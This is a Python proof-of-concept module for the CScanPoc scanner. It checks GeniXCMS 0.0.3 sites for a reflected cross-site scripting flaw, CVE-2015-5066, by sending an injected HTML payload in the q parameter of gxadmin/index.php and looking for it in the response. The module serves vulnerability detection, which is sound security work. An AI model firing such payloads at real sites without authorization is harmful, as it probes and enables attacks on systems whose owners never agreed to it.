# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'GeniXCMS_0000'  # 平台漏洞编号
    name = 'GeniXCMS 0.0.3 - XSS Vulnerabilities'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-06-21'  # 漏洞公布时间
    desc = '''
        gxadmin/index.php 页面参数 q 存在反射性XSS。
    '''  # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/132397/GeniXCMS-0.0.3-Cross-Site-Scripting.html'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-5066'  # cve编号
    product = 'GeniXCMS'  # 漏洞组件名称
    product_version = '0.0.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '52bc36bf-688d-412b-92f4-b05668244123'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + "/gxadmin/index.php?page=posts&q=1'<h1>SEBUG@NET</h1>"
            res = requests.get(vul_url)
            if res.status_code == 200 and '<h1>SEBUG@NET</h1>' in res.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
